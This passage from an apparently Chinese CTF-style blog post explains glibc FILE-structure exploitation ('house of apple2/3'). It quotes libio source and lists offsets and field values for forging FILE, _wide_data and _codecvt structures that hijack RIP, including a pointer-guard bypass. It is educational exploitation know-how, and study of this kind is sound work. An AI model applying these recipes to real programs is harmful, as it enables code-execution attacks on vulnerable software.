class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span></span><br><span class="line">    _IO_wdefault_xsgetn (FILE *fp, <span class="keyword">void</span> *data, <span class="keyword">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">size_t</span> more = n;</span><br><span class="line">    <span class="keyword">wchar_t</span> *s = (<span class="keyword">wchar_t</span>*) data;</span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Data available. */</span></span><br><span class="line">        <span class="keyword">ssize_t</span> count = (fp-&gt;_wide_data-&gt;_IO_read_end</span><br><span class="line">                         - fp-&gt;_wide_data-&gt;_IO_read_ptr);</span><br><span class="line">        <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="keyword">size_t</span>) count &gt; more)</span><br><span class="line">                count = more;</span><br><span class="line">            <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                s = __wmempcpy (s, fp-&gt;_wide_data-&gt;_IO_read_ptr, count);</span><br><span class="line">                fp-&gt;_wide_data-&gt;_IO_read_ptr += count;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">                count = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">wchar_t</span> *p = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">                <span class="keyword">int</span> i = (<span class="keyword">int</span>) count;</span><br><span class="line">                <span class="keyword">while</span> (--i &gt;= <span class="number">0</span>)</span><br><span class="line">                    *s++ = *p++;</span><br><span class="line">                fp-&gt;_wide_data-&gt;_IO_read_ptr = p;</span><br><span class="line">            &#125;</span><br><span class="line">            more -= count;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (more == <span class="number">0</span> || __wunderflow (fp) == WEOF)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_wdefault_xsgetn)</span><br></pre></td></tr></table></figure><p>需要设置<code>fp-&gt;_wide_data-&gt;_IO_read_ptr == fp-&gt;_wide_data-&gt;_IO_read_end</code>，使得<code>count</code>为<code>0</code>，不进入<code>if</code>分支。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">wint_t</span></span><br><span class="line">    __wunderflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_mode &lt; <span class="number">0</span> || (fp-&gt;_mode == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">1</span>) != <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">return</span> WEOF;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)</span><br><span class="line">        _IO_fwide (fp, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (_IO_in_put_mode (fp))</span><br><span class="line">        <span class="keyword">if</span> (_IO_switch_to_wget_mode (fp) == EOF)</span><br><span class="line">            <span class="keyword">return</span> WEOF;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要设置<code>fp-&gt;mode &gt; 0</code>，并且<code>fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING != 0</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">    _IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">            <span class="keyword">return</span> EOF;</span><br><span class="line">    .....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要设置<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code></p><p>构造方式：</p><ol><li><code>_flags</code>设置为<code>0x800</code></li><li><code>vtable</code>设置为<code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wdefault_xsgetn</code>即可</li><li><code>_mode</code>设置为大于<code>0</code>，即满足<code>*(fp + 0xc0) &gt; 0</code></li><li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code>设置为<code>0</code>，即满足<code>*(A + 8) = *A</code></li><li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &gt; *(A + 0x18)</code></li><li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li><li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x18) = C</code></li></ol><h2 id="house-of-apple3"><a href="#house-of-apple3" class="headerlink" title="house of apple3"></a>house of apple3</h2><p>前两篇文章中的利用链主要关注<code>_wide_data</code>成员，而本篇文章并不会特别关注<code>_wide_data</code>，而是关注<code>FILE</code>结构体的另外一个成员<code>_codecvt</code>的利用。</p><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ol><li>已知<code>heap</code>地址和<code>glibc</code>地址</li><li>能控制程序执行<code>IO</code>操作，包括但不限于：从<code>main</code>函数返回、调用<code>exit</code>函数、通过<code>__malloc_assert</code>触发</li><li>能控制<code>_IO_FILE</code>的<code>vtable</code>和<code>_codecvt</code>，一般使用<code>largebin attack</code>去控制</li></ol><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>上面提到，本篇文章并不会特别关注<code>_wide_data</code>成员，这是因为<code>_wide_data</code>设置不当的话会影响某些利用链的分支走向。但是，如果采用默认的<code>_wide_data</code>成员（默认会指向<code>_IO_wide_data_2</code>，除了<code>_wide_vtable</code>外其他成员均默认为<code>0</code>），也并不影响<code>house of apple3</code>的利用。因此，如果能伪造整个<code>FILE</code>结构体，则需要设置合适的<code>_wide_data</code>；如果只能伪部分<code>FILE</code>的成员的话，保持<code>fp-&gt;_wide_data</code>为默认地址即可。</p><h3 id="利用原理-1"><a href="#利用原理-1" class="headerlink" title="利用原理"></a>利用原理</h3><p><code>FILE</code>结构体中有一个成员<code>struct _IO_codecvt *_codecvt;</code>，偏移为<code>0x98</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_iconv_t __cd_in;</span><br><span class="line">  _IO_iconv_t __cd_out;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>__cd_in</code>和<code>__cd_out</code>是同一种类型的数据。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *<span class="title">step</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step_data</span> <span class="title">step_data</span>;</span></span><br><span class="line">&#125; _IO_iconv_t;</span><br></pre></td></tr></table></figure><p>再观察以下结构体俩变量的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_loaded_object</span> *__<span class="title">shlib_handle</span>;</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *__modname;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* For internal use by glibc.  (Accesses to this member must occur</span></span><br><span class="line"><span class="comment">     when the internal __gconv_lock mutex is acquired).  */</span></span><br><span class="line">  <span class="keyword">int</span> __counter;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">char</span> *__from_name;</span><br><span class="line">  <span class="keyword">char</span> *__to_name;</span><br><span class="line"> </span><br><span class="line">  __gconv_fct __fct;</span><br><span class="line">  __gconv_btowc_fct __btowc_fct;</span><br><span class="line">  __gconv_init_fct __init_fct;</span><br><span class="line">  __gconv_end_fct __end_fct;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Information about the number of bytes needed or produced in this</span></span><br><span class="line"><span class="comment">     step.  This helps optimizing the buffer sizes.  */</span></span><br><span class="line">  <span class="keyword">int</span> __min_needed_from;</span><br><span class="line">  <span class="keyword">int</span> __max_needed_from;</span><br><span class="line">  <span class="keyword">int</span> __min_needed_to;</span><br><span class="line">  <span class="keyword">int</span> __max_needed_to;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Flag whether this is a stateful encoding or not.  */</span></span><br><span class="line">  <span class="keyword">int</span> __stateful;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">void</span> *__data;        <span class="comment">/* Pointer to step-local data.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> *__outbuf;    <span class="comment">/* Output buffer for this step.  */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> *__outbufend; <span class="comment">/* Address of first byte after the output</span></span><br><span class="line"><span class="comment">                 buffer.  */</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Is this the last module in the chain.  */</span></span><br><span class="line">  <span class="keyword">int</span> __flags;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Counter for number of invocations of the module function for this</span></span><br><span class="line"><span class="comment">     descriptor.  */</span></span><br><span class="line">  <span class="keyword">int</span> __invocation_counter;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Flag whether this is an internal use of the module (in the mb*towc*</span></span><br><span class="line"><span class="comment">     and wc*tomb* functions) or regular with iconv(3).  */</span></span><br><span class="line">  <span class="keyword">int</span> __internal_use;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">__mbstate_t</span> *__statep;</span><br><span class="line">  <span class="keyword">__mbstate_t</span> __state;    <span class="comment">/* This element must not be used directly by</span></span><br><span class="line"><span class="comment">               any module; always use STATEP!  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>house of apple3</code>的利用主要关注以下三个函数：<code>__libio_codecvt_out</code>、<code>__libio_codecvt_in</code>和<code>__libio_codecvt_length</code>。三个函数的利用点都差不多</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span></span></span><br><span class="line"><span class="class">    __<span class="title">libio_codecvt_in</span> (<span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">codecvt</span>, __<span class="title">mbstate_t</span> *<span class="title">statep</span>,</span></span><br><span class="line"><span class="class">                        <span class="title">const</span> <span class="title">char</span> *<span class="title">from_start</span>, <span class="title">const</span> <span class="title">char</span> *<span class="title">from_end</span>,</span></span><br><span class="line"><span class="class">                        <span class="title">const</span> <span class="title">char</span> **<span class="title">from_stop</span>,</span></span><br><span class="line"><span class="class">                        <span class="title">wchar_t</span> *<span class="title">to_start</span>, <span class="title">wchar_t</span> *<span class="title">to_end</span>, <span class="title">wchar_t</span> **<span class="title">to_stop</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> <span class="title">result</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *<span class="title">gs</span> =</span> codecvt-&gt;__cd_in.step;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">size_t</span> dummy;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *from_start_copy = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *) from_start;</span><br><span class="line"></span><br><span class="line">    codecvt-&gt;__cd_in.step_data.__outbuf = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *) to_start;</span><br><span class="line">    codecvt-&gt;__cd_in.step_data.__outbufend = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *) to_end;</span><br><span class="line">    codecvt-&gt;__cd_in.step_data.__statep = statep;</span><br><span class="line"></span><br><span class="line">    __gconv_fct fct = gs-&gt;__fct;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">    <span class="keyword">if</span> (gs-&gt;__shlib_handle != <span class="literal">NULL</span>)</span><br><span class="line">        PTR_DEMANGLE (fct);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    status = DL_CALL_FCT (fct,</span><br><span class="line">                          (gs, &amp;codecvt-&gt;__cd_in.step_data, &amp;from_start_copy,</span><br><span class="line">                           (<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *) from_end, <span class="literal">NULL</span>,</span><br><span class="line">                           &amp;dummy, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*__gconv_fct)</span> <span class="params">(struct __gconv_step *, struct __gconv_step_data *,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> **, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">unsigned</span> <span class="keyword">char</span> **, <span class="keyword">size_t</span> *, <span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> DL_CALL_FCT</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> DL_CALL_FCT(fct, args) fct args</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>这里呢最后这个宏就是调用fct (gs, …)</p><p>在<code>_IO_wfile_underflow</code>函数中调用了<code>__libio_codecvt_in</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">wint_t</span></span><br><span class="line">    _IO_wfile_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> <span class="title">status</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> count;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">        <span class="keyword">return</span> WEOF;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">        fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">        __set_errno (EBADF);</span><br><span class="line">        <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">        <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">    cd = fp-&gt;_codecvt;</span><br><span class="line">    <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *read_stop = (<span class="keyword">const</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">        fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line">        fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">            fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">        status = __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">                                     fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,</span><br><span class="line">                                     &amp;read_stop,</span><br><span class="line">                                     fp-&gt;_wide_data-&gt;_IO_read_ptr,</span><br><span class="line">                                     fp-&gt;_wide_data-&gt;_IO_buf_end,</span><br><span class="line">                                     &amp;fp-&gt;_wide_data-&gt;_IO_read_end);</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_IO_wfile_underflow</code>又是<code>_IO_wfile_jumps</code>这个<code>_IO_jump_t</code>类型变量的成员函数</p><p>所以总的来说利用方式为：劫持或者伪造<code>FILE</code>结构体的<code>fp-&gt;vtable</code>为<code>_IO_wfile_jumps</code>，<code>fp-&gt;_codecvt</code>为可控堆地址，当程序执行<code>IO</code>操作时，控制程序执行流走到<code>_IO_wfile_underflow</code>，设置好<code>fp-&gt;codecvt-&gt;__cd_in</code>结构体，使得最终调用到<code>__libio_codecvt_in</code>中的<code>DL_CALL_FCT</code>宏，伪造函数指针，进而控制程序执行流。需要注意的是设置gs-&gt;__shlib_handle == NULL绕过__pointer_guard指针的加密保护</p><h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>因为原文作者确实非常牛逼，甚至链都找好了，所以这里还是贴上原文的内容</p><h4 id="IO-wfile-underflow"><a href="#IO-wfile-underflow" class="headerlink" title="_IO_wfile_underflow"></a><strong>_IO_wfile_underflow</strong></h4><p>调用链：<code>_IO_wfile_underflow</code>=&gt;<code>__libio_codecvt_in</code>=&gt;<code>DL_CALL_FCT</code>=&gt;<code>gs =fp-&gt;_codecvt-&gt;__cd_in.step</code>=&gt;<code>*(gs-&gt;__fct)(gs)</code></p><p>这条链是在利用原理当作示例的一条，所以这里只给出构造方式：</p><ol><li><code>_flags</code>设置为<code>~(4 | 0x10)</code></li><li><code>vtable</code>设置为<code>_IO_wfile_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow</code>即可</li><li><code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li><li><code>_wide_data</code>保持默认，或者设置为堆地址，假设其地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li><li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li><li><code>codecvt-&gt;__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code></li><li><code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li><li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制。</li></ol><h4 id="IO-wfile-underflow-mmap-1"><a href="#IO-wfile-underflow-mmap-1" class="headerlink" title="_IO_wfile_underflow_mmap"></a><strong>_IO_wfile_underflow_mmap</strong></h4><p>调用链：<code>_IO_wfile_underflow_mmap</code>=&gt;<code>__libio_codecvt_in</code>=&gt;<code>DL_CALL_FCT</code>=&gt;<code>gs=fp-&gt;_codecvt-&gt;__cd_in.step</code>=&gt;<code>*(gs-&gt;__fct)(gs)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">wint_t</span></span><br><span class="line">    _IO_wfile_underflow_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *read_stop;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">        fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">        __set_errno (EBADF);</span><br><span class="line">        <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">        <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">    cd = fp-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end</span><br><span class="line">        <span class="comment">/* No.  But maybe the read buffer is not fully set up.  */</span></span><br><span class="line">        &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)</span><br><span class="line">        <span class="comment">/* Nothing available.  _IO_file_underflow_mmap has set the EOF or error</span></span><br><span class="line"><span class="comment">       flags as appropriate.  */</span></span><br><span class="line">        <span class="keyword">return</span> WEOF;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">    read_stop = (<span class="keyword">const</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">        <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">free</span> (fp-&gt;_wide_data-&gt;_IO_save_base);</span><br><span class="line">            fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">        &#125;</span><br><span class="line">        _IO_wdoallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">        fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">    __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">                        fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,</span><br><span class="line">                        &amp;read_stop,</span><br><span class="line">                        fp-&gt;_wide_data-&gt;_IO_read_ptr,</span><br><span class="line">                        fp-&gt;_wide_data-&gt;_IO_buf_end,</span><br><span class="line">                        &amp;fp-&gt;_wide_data-&gt;_IO_read_end);</span><br><span class="line">    ......</span><br><span 